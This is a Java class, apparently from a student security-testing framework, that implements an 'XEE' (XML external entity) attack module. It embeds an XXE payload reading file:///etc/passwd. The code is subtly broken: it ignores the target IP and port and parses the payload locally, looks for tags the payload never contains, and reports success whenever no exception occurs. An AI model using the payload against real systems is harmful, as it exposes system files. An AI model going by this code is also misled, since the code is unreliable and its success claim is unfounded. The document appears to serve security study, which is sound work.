package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;
import java.util.Arrays;
import java.util.List;


public class XEEAttack implements Attack {

    @Override
    public String getAttackName() {
        return "XEE Attack";
    }

    @Override
    public void run(Report report, String ip, int port) {




        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();

            String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
                    + "<foo>&xxe;</foo>";

            Document document = builder.parse(new InputSource(new StringReader(maliciousXml)));

            String rootContent = document.getDocumentElement().getTextContent();
            report.append("Root Content: " + rootContent);

            NodeList nodeList = document.getElementsByTagName("node");
            for (int i = 0; i < nodeList.getLength(); i++) {
                Node node = nodeList.item(i);
                report.append("Node " + i + " Content: " + node.getTextContent());
            }

            NodeList sensitiveInfoList = document.getElementsByTagName("sensitiveInfo");
            for (int i = 0; i < sensitiveInfoList.getLength(); i++) {
                Node sensitiveInfoNode = sensitiveInfoList.item(i);
                String sensitiveInfo = sensitiveInfoNode.getTextContent();
                report.append("Sensitive Information found: " + sensitiveInfo);
            }

            // Save results in the report
            report.append("XEE Attack successful!");
        } catch (Exception e) {
            report.append("XEE Attack failed: " + e.getMessage());
        }
    }

    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        // Prior attacks required for this XEE attack
        return Arrays.asList(FindLoginPageAttack.class);
    }
}